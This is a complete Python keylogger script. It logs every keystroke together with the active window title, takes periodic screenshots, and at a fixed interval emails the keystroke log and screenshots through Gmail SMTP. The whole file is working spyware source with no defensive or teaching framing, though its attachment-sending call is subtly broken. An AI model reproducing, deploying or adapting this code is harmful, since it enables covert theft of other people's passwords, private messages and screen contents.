import os
import smtplib
import time
import pygetwindow as gw
from datetime import datetime
from PIL import ImageGrab
from pynput import keyboard
from threading import Timer
LOG_FILE = "keylog.txt"
SCREENSHOT_DIR = "screenshots"
INTERVAL = 60
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

# Function to send an email with attachments
def send_email(subject, body, to_email, from_email, password, attachments=[]):
    msg = f'Subject: {subject}\n\n{body}'
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    for attachment in attachments:
        with open(attachment, 'rb') as file:
            server.sendmail(from_email, to_email, msg, file.read())
    server.quit()

# Function to capture a screenshot
def capture_screenshot():
    now = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    screenshot_path = os.path.join(SCREENSHOT_DIR, f'screenshot_{now}.png')
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    return screenshot_path

# Function to handle key press events
def on_press(key):
    active_window = gw.getActiveWindow()
    active_window_title = active_window.title if active_window else "Unknown"
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a") as f:
        try:
            f.write(f'{timestamp} - {active_window_title} - {key.char}\n')
        except AttributeError:
            special_keys = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.esc: "[ESC]",
            }
            f.write(f'{timestamp} - {active_window_title} - {special_keys.get(key, f"[{key}]")}\n')

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Function to send the log and screenshots via email periodically
def send_log_email(email, password):
    attachments = [LOG_FILE] + [os.path.join(SCREENSHOT_DIR, f) for f in os.listdir(SCREENSHOT_DIR)]
    send_email("Keylogger Report", "Attached are the keylogs and screenshots.", email, email, password, attachments)
    Timer(INTERVAL, send_log_email, args=[email, password]).start()

# Function to get email credentials from the user
def get_email_credentials():
    email = input("Enter your email address: ")
    password = input("Enter your email password: ")
    return email, password

# Function to start the keylogger
def start_keylogger():
    email, password = get_email_credentials()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        Timer(INTERVAL, send_log_email, args=[email, password]).start()
        listener.join()

if __name__ == "__main__":
    start_keylogger()


